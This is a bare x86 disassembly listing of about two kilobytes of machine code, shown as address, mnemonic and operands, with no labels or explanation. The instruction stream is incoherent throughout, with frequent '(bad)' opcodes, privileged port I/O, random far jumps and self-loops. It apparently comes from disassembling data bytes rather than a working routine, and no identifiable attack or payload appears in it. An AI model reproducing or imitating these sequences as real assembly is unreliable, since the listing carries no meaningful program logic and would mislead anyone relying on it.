  4068d8:	dec    esp
  4068d9:	jb     0x406941
  4068db:	pop    es
  4068dc:	fdiv   st(4),st
  4068de:	aas    
  4068df:	sbb    ch,BYTE PTR [eax+0x544b65d1]
  4068e5:	or     eax,0x495a2186
  4068ea:	xor    ah,BYTE PTR ds:[ebp+0x3c88cd3c]
  4068f1:	ins    DWORD PTR es:[edi],dx
  4068f2:	dec    eax
  4068f3:	push   ecx
  4068f4:	mov    WORD PTR [esi-0x5d2193c6],?
  4068fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4068fb:	rol    BYTE PTR [esp+edi*4+0x6e71a559],cl
  406902:	ins    BYTE PTR es:[edi],dx
  406903:	xchg   cl,dl
  406905:	sub    eax,DWORD PTR [edi+0x7493b8]
  40690b:	sti    
  40690c:	jmp    0x6f26f7a4
  406911:	cmp    eax,DWORD PTR [ebx+esi*2-0x4e]
  406915:	add    al,0xcf
  406917:	loopne 0x4068cc
  406919:	mov    ecx,0x67ec6c31
  40691e:	movd   DWORD PTR [ebx],mm7
  406921:	inc    edx
  406922:	mov    esp,0xfd459188
  406927:	loope  0x40696a
  406929:	es xchg ecx,eax
  40692b:	mov    DWORD PTR [esi-0x6fcd83a0],esi
  406931:	aam    0x11
  406933:	mov    WORD PTR [ebp*2+0x1c562708],ds
  40693a:	sbb    edx,DWORD PTR [eax-0x48602407]
  406940:	cmp    DWORD PTR ds:0x467e1725,0xe7c78869
  40694a:	adc    esi,edx
  40694c:	test   al,0xaa
  40694e:	xchg   ebx,eax
  40694f:	sahf   
  406950:	xchg   edi,eax
  406951:	mov    ch,0xd2
  406953:	les    edx,FWORD PTR [edi-0x3ff44a18]
  406959:	mov    edi,0xc5c0851b
  40695e:	sub    DWORD PTR [ebx+ecx*4],edx
  406961:	loopne 0x4069a0
  406963:	ja     0x406947
  406965:	mov    ah,0x34
  406967:	pushf  
  406968:	lea    edi,[ebx]
  40696a:	dec    ebp
  40696b:	loop   0x40695a
  40696d:	call   FWORD PTR [ebx-0x3120f603]
  406973:	and    eax,DWORD PTR [ebx-0x6c]
  406976:	jecxz  0x40699f
  406978:	push   es
  406979:	mov    ebx,0x52127d87
  40697e:	xchg   ebp,eax
  40697f:	fbstp  TBYTE PTR [edi+0x38]
  406982:	stc    
  406983:	jbe    0x406939
  406985:	aaa    
  406986:	pop    edi
  406987:	mul    BYTE PTR [edx]
  406989:	jge    0x406989
  40698b:	adc    edi,edi
  40698d:	mul    al
  40698f:	aaa    
  406990:	add    DWORD PTR [edi+0x78],0xa108b079
  406997:	test   BYTE PTR [ecx-0x3f],0x42
  40699b:	adc    eax,0xcc5b6d7
  4069a0:	pop    ss
  4069a1:	sar    BYTE PTR [ebx],cl
  4069a3:	les    eax,FWORD PTR [ebp+0x5d2991b4]
  4069a9:	xor    al,0x6d
  4069ab:	inc    ecx
  4069ac:	jmp    0xda3b:0x9e4bf2e6
  4069b3:	sub    DWORD PTR [esp+ecx*2+0x3c],eax
  4069b7:	adc    BYTE PTR [edx+0x13],bl
  4069ba:	into   
  4069bb:	out    dx,al
  4069bc:	mov    DWORD PTR [ebp-0x55],0x9ba850ab
  4069c3:	shr    DWORD PTR [edi],cl
  4069c5:	jb     0x406a19
  4069c7:	jb     0x406976
  4069c9:	in     al,0xcb
  4069cb:	cmp    eax,0x3b025d1
  4069d0:	push   edi
  4069d1:	aam    0x83
  4069d3:	imul   ebx
  4069d5:	imul   esp,DWORD PTR [edi+0x2a],0x7f
  4069d9:	std    
  4069da:	and    DWORD PTR [edx+0x4b],eax
  4069dd:	adc    BYTE PTR [ebp-0x5ffe6696],dh
  4069e3:	adc    al,BYTE PTR [edx]
  4069e5:	pop    ecx
  4069e6:	inc    eax
  4069e7:	fsub   st(4),st
  4069e9:	repz or al,0x8c
  4069ec:	inc    esi
  4069ed:	add    al,0x6f
  4069ef:	jnp    0x4069d5
  4069f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4069f2:	lea    ecx,[ebp+0x27]
  4069f5:	cli    
  4069f6:	push   ebx
  4069f7:	xor    al,0x60
  4069f9:	stc    
  4069fa:	bound  edx,QWORD PTR [edx-0x71628d3f]
  406a00:	lahf   
  406a01:	pop    esp
  406a02:	ret    0x8881
  406a05:	mov    ebx,0x35ad734a
  406a0a:	out    dx,eax
  406a0b:	psrlq  mm0,QWORD PTR [edi-0x14]
  406a0f:	pop    esi
  406a10:	xchg   esp,eax
  406a11:	or     al,0xef
  406a13:	in     al,dx
  406a14:	test   eax,0x1c4f7de7
  406a19:	imul   ecx,edx,0xb4c52fae
  406a1f:	sub    bl,BYTE PTR [edi-0x14]
  406a22:	dec    eax
  406a23:	dec    ecx
  406a24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406a25:	gs pusha 
  406a27:	aad    0x69
  406a29:	dec    ecx
  406a2a:	mov    al,ds:0xc3bfd10b
  406a2f:	mov    BYTE PTR [eax],bh
  406a31:	jne    0x406a55
  406a33:	pop    edx
  406a34:	add    DWORD PTR [edi],edi
  406a36:	stos   BYTE PTR es:[edi],al
  406a37:	mov    DWORD PTR [edi-0x57],esi
  406a3a:	aam    0x11
  406a3c:	mov    ds:0x304f4fcd,al
  406a41:	pop    esp
  406a42:	test   edx,ecx
  406a44:	ss popa 
  406a46:	(bad)  
  406a48:	xor    eax,0x3c096f80
  406a4d:	mov    gs,WORD PTR [esi+edx*1-0x5]
  406a51:	adc    BYTE PTR [edx],dl
  406a53:	xor    bl,BYTE PTR [esi]
  406a55:	out    0x6,eax
  406a57:	repnz cwde 
  406a59:	js     0x406aab
  406a5b:	repnz adc DWORD PTR [esi-0x6aef18ee],ebx
  406a62:	mov    bl,0x5a
  406a64:	dec    ebx
  406a65:	pop    ebx
  406a66:	mov    eax,0x1245fcc9
  406a6b:	mov    esp,0x6d17a53a
  406a70:	std    
  406a71:	adc    DWORD PTR [eax],edi
  406a73:	(bad)  
  406a74:	out    dx,al
  406a75:	xor    al,0xa7
  406a77:	sbb    bh,BYTE PTR ds:0x5994d2d1
  406a7d:	mov    BYTE PTR [esi+0x48251d48],dh
  406a83:	ds dec esp
  406a85:	mov    ch,0x74
  406a87:	add    cl,BYTE PTR [edx+0x36]
  406a8a:	mov    cl,BYTE PTR [edi]
  406a8c:	sbb    DWORD PTR [eax-0x72],eax
  406a8f:	xchg   edx,eax
  406a90:	pavgb  mm2,QWORD PTR [ecx+0x589e9c88]
  406a97:	and    cl,cl
  406a99:	add    ah,bl
  406a9b:	mov    dl,0x54
  406a9d:	ret    0x66aa
  406aa0:	pop    eax
  406aa1:	add    al,0x90
  406aa3:	mov    eax,0xd8667205
  406aa8:	mov    ecx,DWORD PTR [ebx+0x5c96c66a]
  406aae:	lods   eax,DWORD PTR ds:[esi]
  406aaf:	xchg   esp,eax
  406ab0:	(bad)  
  406ab1:	std    
  406ab2:	fstp   DWORD PTR [ebx-0xca64269]
  406ab8:	xchg   edx,eax
  406ab9:	cs daa 
  406abb:	pusha  
  406abc:	mov    al,ds:0x30276e5f
  406ac1:	test   al,0xd9
  406ac3:	sub    esi,ebp
  406ac5:	jg     0x406b29
  406ac7:	enter  0xc377,0x77
  406acb:	into   
  406acc:	arpl   WORD PTR [eax+ebx*2-0x4f355e5b],bp
  406ad3:	xchg   ebx,eax
  406ad4:	ret    
  406ad5:	imul   esi
  406ad7:	jmp    0x406a95
  406ad9:	(bad)  
  406ada:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406adb:	pop    es
  406adc:	dec    eax
  406add:	fdivrp st(6),st
  406adf:	or     al,0xce
  406ae1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406ae2:	stos   BYTE PTR es:[edi],al
  406ae3:	or     al,0xf3
  406ae5:	loopne 0x406a78
  406ae7:	xchg   esi,eax
  406ae8:	loop   0x406a6f
  406aea:	aas    
  406aeb:	inc    esp
  406aec:	daa    
  406aed:	stos   DWORD PTR es:[edi],eax
  406aee:	pop    ebx
  406aef:	imul   eax,DWORD PTR [edx-0x2d],0x5438e331
  406af6:	lods   eax,DWORD PTR ds:[esi]
  406af7:	push   ebx
  406af8:	out    dx,al
  406af9:	aaa    
  406afa:	inc    edx
  406afb:	xor    ebp,DWORD PTR [edx+edi*8-0x18]
  406aff:	cli    
  406b00:	clc    
  406b01:	shl    BYTE PTR [edx+0x746184c7],1
  406b07:	js     0x406b2d
  406b09:	outs   dx,BYTE PTR ds:[esi]
  406b0a:	push   ecx
  406b0b:	mov    bh,0x65
  406b0d:	jns    0x406b64
  406b0f:	(bad)
  406b13:	hlt    
  406b14:	rcl    BYTE PTR [edx-0x33],1
  406b17:	or     eax,0xc9a21d6
  406b1c:	pop    ds
  406b1d:	neg    BYTE PTR ds:0x35950ca2
  406b23:	push   esp
  406b24:	sub    al,0x1e
  406b26:	scas   al,BYTE PTR es:[edi]
  406b27:	es stos BYTE PTR es:[edi],al
  406b29:	xor    al,0xb7
  406b2b:	mov    al,0x8d
  406b2d:	inc    esp
  406b2e:	fwait
  406b2f:	or     eax,0xb0fc2579
  406b34:	push   ebp
  406b35:	ret    0x486b
  406b38:	mov    bh,0x68
  406b3a:	dec    edx
  406b3b:	dec    edx
  406b3c:	cdq    
  406b3d:	mov    al,ds:0x4f5b6f6
  406b42:	data16 ror ch,1
  406b45:	pop    ecx
  406b46:	mov    ds:0xb6740622,eax
  406b4b:	dec    esp
  406b4c:	or     BYTE PTR [esi],ah
  406b4e:	sbb    al,0xf0
  406b50:	cmp    eax,0x72880fe2
  406b55:	cwde   
  406b56:	mov    bl,BYTE PTR [edx-0x6d3e0582]
  406b5c:	and    al,0x2a
  406b5e:	sub    edi,edi
  406b60:	int    0x5b
  406b62:	adc    ecx,DWORD PTR [eax+0x3d596830]
  406b68:	or     dl,dh
  406b6a:	fisub  WORD PTR [eax+0x2789fe79]
  406b70:	and    al,0xec
  406b72:	or     BYTE PTR [eax],bl
  406b74:	adc    al,0x9
  406b76:	mov    DWORD PTR [ecx],0x8a7bc523
  406b7c:	enter  0xeb0,0x4b
  406b80:	mov    ebp,0xd5f2398a
  406b85:	shl    ch,cl
  406b87:	or     al,dh
  406b89:	(bad)  
  406b8a:	xchg   ebx,eax
  406b8b:	lea    ebx,[esi-0x16f07107]
  406b91:	push   es
  406b92:	xchg   ebp,eax
  406b93:	shl    DWORD PTR [ebx],1
  406b95:	push   eax
  406b96:	xchg   edi,eax
  406b97:	es jnp 0x406b22
  406b9a:	pusha  
  406b9b:	inc    edx
  406b9c:	or     cl,BYTE PTR [esi]
  406b9e:	stos   DWORD PTR es:[edi],eax
  406b9f:	inc    edx
  406ba0:	leave  
  406ba1:	adc    eax,0xcf415064
  406ba6:	lahf   
  406ba7:	cmp    DWORD PTR [eax+eax*8-0x2c],0xfffffff0
  406bac:	ror    BYTE PTR [ebx-0x22],0xc9
  406bb0:	test   DWORD PTR [esi-0x17b0d3a9],0xc8b03b4d
  406bba:	mov    bl,0xf2
  406bbc:	leave  
  406bbd:	das    
  406bbe:	out    0xa1,al
  406bc0:	and    al,0x3c
  406bc2:	fwait
  406bc3:	xchg   ebx,eax
  406bc4:	outs   dx,BYTE PTR ds:[esi]
  406bc5:	pop    eax
  406bc6:	aaa    
  406bc7:	stc    
  406bc8:	push   ss
  406bc9:	mov    cl,0xe0
  406bcb:	hlt    
  406bcc:	jno    0x406b75
  406bce:	(bad)  
  406bcf:	(bad)  
  406bd0:	aad    0x53
  406bd2:	in     al,0xde
  406bd4:	(bad)
  406bd8:	iret   
  406bd9:	sar    BYTE PTR [ebx-0x71],0xd9
  406bdd:	leave  
  406bde:	mov    WORD PTR [esi],fs
  406be0:	ffree  st(7)
  406be2:	add    BYTE PTR [ebp+0x70],cl
  406be5:	sub    BYTE PTR [edx],al
  406be7:	push   esi
  406be8:	sbb    cl,BYTE PTR [edi-0x3d5a49c3]
  406bee:	sub    BYTE PTR [ebx-0x4cdbd6e3],dh
  406bf4:	mov    esi,0xeff87bbe
  406bf9:	out    0x7,al
  406bfb:	sbb    DWORD PTR [eax],esi
  406bfd:	mov    ds:0x9cc0b119,al
  406c02:	cli    
  406c03:	ror    DWORD PTR [edi-0x5df33338],0x99
  406c0a:	fimul  WORD PTR ds:0x481a8614
  406c10:	cld    
  406c11:	pop    esi
  406c12:	push   esp
  406c13:	in     eax,0xa6
  406c15:	adc    DWORD PTR [edx],ecx
  406c17:	and    al,0x55
  406c19:	jg     0x406be1
  406c1b:	mov    ds:0xe27f8e75,al
  406c20:	and    BYTE PTR [esi],0x7c
  406c23:	mov    dl,0x7d
  406c25:	ins    BYTE PTR es:[edi],dx
  406c26:	mov    edx,0xfbf287aa
  406c2b:	adc    eax,0xa3702f86
  406c30:	add    eax,0xe8249366
  406c35:	das    
  406c36:	out    0x6d,eax
  406c38:	int    0x18
  406c3a:	lock ins BYTE PTR es:[edi],dx
  406c3c:	jmp    0xa2263d2
  406c41:	or     eax,0xf28f943c
  406c46:	in     eax,0x50
  406c48:	test   al,0xc1
  406c4a:	push   edi
  406c4b:	adc    esi,DWORD PTR ds:0x211ee913
  406c51:	inc    ecx
  406c52:	lods   al,BYTE PTR ds:[esi]
  406c53:	fidiv  DWORD PTR [eax+0x298fbf28]
  406c59:	sbb    al,BYTE PTR [ebp-0x22b72c95]
  406c5f:	cs dec ebx
  406c61:	cmc    
  406c62:	jmp    0x406ca1
  406c64:	mov    ebp,0x96bf36e5
  406c69:	std    
  406c6a:	xchg   ebp,eax
  406c6b:	pop    eax
  406c6c:	add    ebp,0x3f7176c2
  406c72:	sti    
  406c73:	je     0x406c16
  406c75:	mov    ds:0xa8371b49,al
  406c7a:	jae    0x406bfe
  406c7c:	sub    al,0xd2
  406c7e:	xchg   esi,eax
  406c7f:	int    0x4d
  406c81:	or     DWORD PTR [ebx],0x1138df6c
  406c87:	push   ss
  406c88:	ret    
  406c89:	jne    0x406cf5
  406c8b:	mov    eax,ds:0xef2ea7ee
  406c90:	adc    BYTE PTR [esi],ch
  406c92:	sbb    BYTE PTR [esi-0x2386c364],0xcc
  406c99:	mov    ebx,ecx
  406c9b:	pmullw mm6,QWORD PTR [ebp-0x3b]
  406c9f:	imul   esp,DWORD PTR [edi+ebp*2+0x6c32b81b],0xffffffea
  406ca7:	test   BYTE PTR [edx],0xd6
  406caa:	pusha  
  406cab:	mov    dh,0xf9
  406cad:	and    al,0xc
  406caf:	mov    eax,0x7c9fefe2
  406cb4:	sub    eax,0x348c79f6
  406cb9:	xor    BYTE PTR [edi+0x51],dl
  406cbc:	mov    al,ds:0x7ae23d7a
  406cc1:	xchg   ebx,eax
  406cc2:	sahf   
  406cc3:	push   ecx
  406cc4:	mov    edi,DWORD PTR ds:0x1dd2a873
  406cca:	cld    
  406ccb:	adc    DWORD PTR [esi-0xb85e3a8],esi
  406cd1:	dec    edi
  406cd2:	in     al,dx
  406cd3:	adc    eax,DWORD PTR [eax-0x4ca26e83]
  406cd9:	sahf   
  406cda:	inc    ecx
  406cdb:	push   edi
  406cdc:	aas    
  406cdd:	jle    0x406cdb
  406cdf:	test   DWORD PTR [edx+0x72],edx
  406ce2:	pop    eax
  406ce3:	(bad)  
  406ce4:	leave  
  406ce5:	sbb    al,0x9c
  406ce7:	xchg   edx,eax
  406ce8:	(bad)  
  406ce9:	sar    DWORD PTR [edx-0x42e44abd],1
  406cef:	add    al,0xc0
  406cf1:	shl    BYTE PTR [esp+esi*4],cl
  406cf4:	cld    
  406cf5:	lods   eax,DWORD PTR ds:[esi]
  406cf6:	add    DWORD PTR [edx],eax
  406cf8:	adc    al,0x9
  406cfa:	xchg   bh,ch
  406cfc:	add    dh,bh
  406cfe:	adc    BYTE PTR [eax],0xdf
  406d01:	xchg   edx,eax
  406d02:	cmp    eax,0x6bfde354
  406d07:	adc    edi,0x2f78c459
  406d0d:	fidiv  WORD PTR [eax+0x64c50008]
  406d13:	and    DWORD PTR [edi+0x678b53a6],ecx
  406d19:	mov    ch,0xec
  406d1b:	retf   
  406d1c:	jmp    0x1e42:0xf76b201e
  406d23:	jl     0x406d48
  406d25:	mov    dl,0xca
  406d27:	sub    BYTE PTR [eax+eax*8-0xa],ah
  406d2b:	outs   dx,DWORD PTR ds:[esi]
  406d2c:	jnp    0x406cbb
  406d2e:	loope  0x406cf4
  406d30:	push   ebp
  406d31:	lock out 0x96,al
  406d34:	mov    BYTE PTR [edi-0x74a749d4],dl
  406d3a:	xchg   DWORD PTR [ecx-0x4d],esp
  406d3d:	mov    edi,0x9c57320b
  406d42:	mov    eax,ds:0x678b13a0
  406d47:	jae    0xad90d80c
  406d4d:	in     al,dx
  406d4e:	lahf   
  406d4f:	cld    
  406d50:	xchg   edx,eax
  406d51:	push   eax
  406d52:	add    BYTE PTR [edi-0x802781e],0x66
  406d59:	cwde   
  406d5a:	cwde   
  406d5b:	imul   edx,DWORD PTR [ebx-0x47ebb887],0xffffffdb
  406d62:	or     eax,0xb7349d43
  406d67:	fisubr WORD PTR [edx-0x69]
  406d6a:	lock pusha 
  406d6c:	inc    eax
  406d6d:	sti    
  406d6e:	and    BYTE PTR [edi],al
  406d70:	cmp    ch,dh
  406d72:	inc    ebx
  406d73:	pusha  
  406d74:	pop    ds
  406d75:	mov    dl,bl
  406d77:	jo     0x406d2a
  406d79:	into   
  406d7a:	outs   dx,BYTE PTR ss:[esi]
  406d7c:	lahf   
  406d7d:	std    
  406d7e:	rcr    DWORD PTR [ebp-0x73dbd1d2],1
  406d84:	daa    
  406d85:	or     al,BYTE PTR [eax]
  406d87:	mov    dh,0xf0
  406d89:	hlt    
  406d8a:	nop
  406d8b:	add    eax,0xe0d15406
  406d90:	xchg   ecx,eax
  406d91:	ret    0xfe14
  406d94:	ins    BYTE PTR es:[edi],dx
  406d95:	cwde   
  406d96:	or     eax,ebx
  406d98:	push   esi
  406d99:	rcr    ecx,0x43
  406d9c:	fnstcw WORD PTR [bp-0x6f30]
  406da1:	repz mov ds:0xfa7aa819,eax
  406da7:	push   ss
  406da8:	shr    BYTE PTR [edi*8-0xd50a95c],1
  406daf:	not    BYTE PTR [ebx-0x1a]
  406db2:	ja     0x406de9
  406db4:	jns    0x406d6a
  406db6:	rcr    esi,0xa5
  406db9:	dec    ecx
  406dba:	sbb    eax,0xeaa8ce48
  406dbf:	pop    ebp
  406dc0:	mov    ebp,0x6a468b12
  406dc5:	pushf  
  406dc6:	xor    edi,esp
  406dc8:	(bad)
  406dcb:	fbstp  TBYTE PTR cs:[edi+eiz*8+0x481bf070]
  406dd3:	fcom   DWORD PTR [ecx-0x2c]
  406dd6:	adc    DWORD PTR [esi+ecx*1-0x75],esi
  406dda:	pop    ecx
  406ddb:	icebp  
  406ddc:	add    ah,BYTE PTR [ebp+0x626eddbc]
  406de2:	shl    DWORD PTR [esi-0x506f5316],1
  406de8:	je     0x406d81
  406dea:	xchg   DWORD PTR [edx+0x1586c2ae],eax
  406df0:	push   eax
  406df1:	rcl    BYTE PTR [ecx-0x10],0x1b
  406df5:	jmp    0xb1aeee9b
  406dfa:	in     eax,0x1e
  406dfc:	ror    ebx,1
  406dfe:	xchg   ebp,eax
  406dff:	sbb    eax,0x26c7e0bb
  406e04:	sbb    al,0xae
  406e06:	out    dx,eax
  406e07:	lds    edx,FWORD PTR [edx]
  406e09:	mov    ebp,0x82dd42aa
  406e0e:	es mov esp,0xea36fb10
  406e14:	pop    edx
  406e15:	xor    DWORD PTR [edi+0x3b1e5266],esi
  406e1b:	inc    ecx
  406e1c:	inc    ebp
  406e1d:	add    esp,DWORD PTR [esi-0x6f]
  406e20:	and    ecx,DWORD PTR [ecx-0x66]
  406e23:	retf   
  406e24:	jnp    0x406e45
  406e26:	test   eax,0xed9e5a6f
  406e2b:	cmp    DWORD PTR [edx],esp
  406e2d:	sub    eax,0x9c9bd135
  406e32:	stos   DWORD PTR es:[edi],eax
  406e33:	cli    
  406e34:	xor    ebx,DWORD PTR ds:0xd9bc1994
  406e3a:	xor    esi,esi
  406e3c:	add    eax,0xdf9ced71
  406e41:	addr16 int3 
  406e43:	or     ebx,ebx
  406e45:	fwait
  406e46:	mov    WORD PTR gs:[esi-0x2d4b978],es
  406e4d:	inc    esp
  406e4f:	shr    BYTE PTR [ebx+ecx*4-0x1d],0x50
  406e54:	addr16 push edi
  406e56:	dec    edx
  406e57:	shl    DWORD PTR [edx-0x7],cl
  406e5a:	dec    ebx
  406e5b:	and    BYTE PTR [ecx],al
  406e5d:	sub    ebx,DWORD PTR [ecx-0x51863c54]
  406e63:	gs scas al,BYTE PTR es:[edi]
  406e65:	mov    edi,0x261ff56a
  406e6a:	add    DWORD PTR ds:0x823fff27,eax
  406e70:	pop    edx
  406e71:	mov    edi,0xd0f91545
  406e76:	dec    ecx
  406e77:	stos   DWORD PTR es:[edi],eax
  406e78:	outs   dx,BYTE PTR ds:[esi]
  406e79:	dec    ecx
  406e7a:	sbb    eax,0xf6cff73c
  406e7f:	add    al,0x96
  406e81:	mov    BYTE PTR [esi-0x3dab2ab4],dl
  406e87:	mov    ?,WORD PTR [esi-0x29ecba26]
  406e8d:	or     DWORD PTR ds:0x881cff62,edx
  406e93:	adc    BYTE PTR [eax+0x61],0x67
  406e97:	enter  0x4a95,0x37
  406e9b:	shl    bh,1
  406e9d:	push   ss
  406e9e:	in     al,0x9b
  406ea0:	mov    cl,0xc4
  406ea2:	outs   dx,DWORD PTR ds:[esi]
  406ea3:	or     bl,BYTE PTR ds:[edx-0x5e]
  406ea7:	pop    esp
  406ea8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406ea9:	aaa    
  406eaa:	or     BYTE PTR [edx-0x2cbeb968],bh
  406eb0:	dec    BYTE PTR [ebx-0xe8c7a52]
  406eb6:	arpl   cx,bx
  406eb8:	mov    ecx,0x8b45ee
  406ebd:	mov    esi,0xdebd83a2
  406ec2:	dec    ecx
  406ec3:	aad    0x3b
  406ec5:	in     eax,0x3f
  406ec7:	and    bl,BYTE PTR [ebx-0x4a6d81d5]
  406ecd:	jo     0x406ea0
  406ecf:	and    eax,0x50ddd071
  406ed4:	cmp    eax,0xb9d77c46
  406ed9:	js     0x406ec7
  406edb:	addr16 sub eax,0xd9b5a06d
  406ee1:	mov    al,0xa2
  406ee3:	imul   edx,DWORD PTR [eax+ebx*1],0xe53c6c5a
  406eea:	sahf   
  406eeb:	adc    BYTE PTR [edx+0x10b05bf4],dl
  406ef1:	lods   al,BYTE PTR ds:[esi]
  406ef2:	dec    edi
  406ef3:	push   ebx
  406ef4:	inc    ebp
  406ef5:	test   cl,bh
  406ef7:	jmp    0x406f6d
  406ef9:	test   BYTE PTR ds:[ebx],ah
  406efc:	jne    0x406ea7
  406efe:	mov    ecx,edx
  406f00:	xchg   edi,eax
  406f01:	in     al,0x78
  406f03:	je     0x406ee0
  406f05:	or     edx,DWORD PTR [edi]
  406f07:	repz test esp,ebp
  406f0a:	ficomp WORD PTR [esi]
  406f0c:	jnp    0x406f0b
  406f0e:	aad    0x9c
  406f10:	add    DWORD PTR [ebx-0x41996c87],ebp
  406f16:	pop    esp
  406f17:	xor    eax,0x6b7feb00
  406f1c:	imul   ecx
  406f1e:	jno    0x406eda
  406f20:	or     eax,0xc0a089f0
  406f25:	push   0x1c15afae
  406f2a:	loope  0x406f0e
  406f2c:	inc    esi
  406f2d:	mov    DWORD PTR [ebx+0x66],0xd755f65b
  406f34:	data16 sub al,0x5b
  406f37:	xor    BYTE PTR [ebp+0x5407287c],bh
  406f3d:	or     BYTE PTR [eax],ch
  406f3f:	fmul   DWORD PTR [esp+ecx*4]
  406f42:	out    0x7,eax
  406f44:	sub    ebx,DWORD PTR fs:[edi-0x84add4e]
  406f4b:	imul   esi,DWORD PTR [esp+edi*4],0x377e2586
  406f52:	sbb    eax,0xffffffab
  406f55:	mov    bl,0x49
  406f57:	cmp    eax,ebp
  406f59:	retf   0xd270
  406f5c:	jmp    0x1b3bfbf4
  406f61:	add    BYTE PTR [esi-0x76],bh
  406f64:	push   ebx
  406f65:	popa   
  406f66:	pop    ecx
  406f67:	stos   BYTE PTR es:[edi],al
  406f68:	js     0x406fd1
  406f6a:	js     0x406f0c
  406f6c:	popa   
  406f6d:	push   edx
  406f6e:	mov    ebp,0x86116710
  406f73:	push   0x91bacfe1
  406f78:	fcmovnbe st,st(5)
  406f7a:	inc    ebp
  406f7b:	cmp    al,0x30
  406f7d:	out    dx,eax
  406f7e:	retf   0x4b0
  406f81:	repz jge 0x406fd6
  406f84:	hlt    
  406f85:	push   es
  406f86:	and    BYTE PTR [edi-0x2b9e171d],ch
  406f8c:	lock call 0x563718a5
  406f92:	cwde   
  406f93:	xchg   esi,eax
  406f94:	push   0x2
  406f96:	xlat   BYTE PTR ds:[ebx]
  406f97:	inc    ebx
  406f98:	inc    ebp
  406f99:	xchg   esi,eax
  406f9a:	push   edi
  406f9b:	lods   al,BYTE PTR ds:[esi]
  406f9c:	sub    BYTE PTR [ecx-0x56],0x39
  406fa0:	mov    DWORD PTR [ebx+0x101b2534],edx
  406fa6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406fa7:	cmp    eax,0xe7830b7b
  406fac:	jl     0x406f4f
  406fae:	cli    
  406faf:	pop    ebx
  406fb0:	mov    cs,WORD PTR [edi-0x267000c6]
  406fb6:	xchg   ecx,eax
  406fb7:	bound  ebx,QWORD PTR [edi+esi*1]
  406fba:	test   al,0x88
  406fbc:	jbe    0x406f68
  406fbe:	jle    0x406f63
  406fc0:	imul   ebx,edi,0x3ff7ef38
  406fc6:	push   ds
  406fc7:	mov    DWORD PTR [ecx],0x8ae7c7d5
  406fcd:	or     ch,al
  406fcf:	jbe    0x406f63
  406fd1:	pop    esi
  406fd2:	leave  
  406fd3:	dec    ebp
  406fd4:	loop   0x406fff
  406fd6:	js     0x406fa6
  406fd8:	xchg   esi,edx
  406fda:	imul   ecx,DWORD PTR [ebx],0x5c683d72
  406fe0:	outs   dx,DWORD PTR ds:[esi]
  406fe1:	je     0x406fa9
  406fe3:	out    0x6e,al
  406fe5:	outs   dx,BYTE PTR ds:[esi]
  406fe6:	or     DWORD PTR [edi-0x2e],0x7f
  406fea:	mov    ebp,0xffa2662a
  406fef:	mov    gs,WORD PTR [ecx]
  406ff1:	jecxz  0x406fea
  406ff3:	test   bh,0x7d
  406ff6:	cmp    BYTE PTR [ecx-0x40190412],bl
  406ffc:	sub    cl,ch
  406ffe:	jnp    0x406ffc
  407000:	ins    BYTE PTR es:[edi],dx
  407001:	retf   0x166e
  407004:	cmp    edx,DWORD PTR [ecx+0xc]
  407007:	sar    ch,cl
  407009:	mov    al,ds:0xcdcac229
  40700e:	js     0x406fda
  407010:	xor    ecx,DWORD PTR [edx+eax*4-0x64724ed5]
  407017:	mov    ch,0x8e
  407019:	mov    bh,dh
  40701b:	fdiv   QWORD PTR [ecx]
  40701d:	inc    edi
  40701e:	pop    ds
  40701f:	xchg   DWORD PTR [esi+0x1d],esp
  407022:	xchg   ebp,eax
  407023:	adc    eax,0x4ba53040
  407028:	xor    eax,0x74d28666
  40702d:	nop
  40702e:	inc    edi
  40702f:	sti    
  407030:	sub    DWORD PTR [ebp+0x53ebbcb5],ebp
  407036:	push   eax
  407037:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407038:	jnp    0x407069
  40703a:	cld    
  40703b:	inc    ebx
  40703c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40703d:	jmp    0x139e1b2d
  407042:	aad    0xf9
  407044:	fisub  WORD PTR [ebx+0x12]
  407047:	jae    0x40707c
  407049:	aaa    
  40704a:	retf   
  40704b:	(bad)  
  40704c:	and    bl,al
  40704e:	popa   
  40704f:	xor    BYTE PTR [esp+ecx*2+0x57b8be71],bh
  407056:	loopne 0x407023
  407058:	adc    eax,0xef8f817e
  40705d:	or     eax,0xd9eb45b5
  407062:	adc    eax,0x8e69e9d9
  407067:	pop    edi
  407068:	cmp    eax,0xebd8b7d9
  40706d:	fs mov cl,0x53
  407070:	ret    0xe647
  407073:	lock mov ds:0x16795358,al
  407079:	enter  0x7ec2,0x2e
  40707d:	into   
  40707e:	jb     0x407010
  407080:	fistp  QWORD PTR [esi-0x18]
  407083:	rcr    BYTE PTR [edx],1
  407085:	pop    esp
  407086:	aad    0xb2
  407088:	scas   al,BYTE PTR es:[edi]
  407089:	je     0x407037
  40708b:	es push ds
  40708d:	cmp    DWORD PTR [edi+edi*2],edx
  407090:	fild   DWORD PTR ds:0x4cb7b7ca
  407096:	sbb    DWORD PTR [eax+ecx*4-0x5ee873f6],0xffffff8b
  40709e:	fisttp WORD PTR [ebx]
  4070a0:	(bad)  [edx]
  4070a2:	out    0x5b,eax
  4070a4:	in     al,0x2f
  4070a6:	inc    ebx
  4070a7:	mov    ch,0x1f
  4070a9:	outs   dx,BYTE PTR ds:[esi]
  4070aa:	shl    DWORD PTR [ebx+0x1b],cl
  4070ad:	xchg   edx,edx
  4070af:	or     ch,BYTE PTR [ebx]
  4070b1:	or     bl,cl
  4070b3:	push   ds
  4070b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4070b5:	mov    edi,0x10121a76
  4070ba:	icebp  
  4070bb:	xchg   ebx,ecx
  4070bd:	in     al,dx
  4070be:	fbld   TBYTE PTR [ebx-0x7c1a73a7]
  4070c4:	push   edi
  4070c5:	(bad)  
  4070c6:	mov    esi,0x85093ff4
  4070cb:	sub    dl,dl
  4070cd:	jmp    0x40710c
  4070cf:	or     al,0x5
  4070d1:	jae    0x407105
  4070d3:	outs   dx,BYTE PTR ds:[esi]
  4070d4:	sti    
  4070d5:	pop    eax
  4070d6:	cmp    BYTE PTR [esi-0x66dc45c],al
  4070dc:	(bad)  
  4070dd:	out    dx,eax
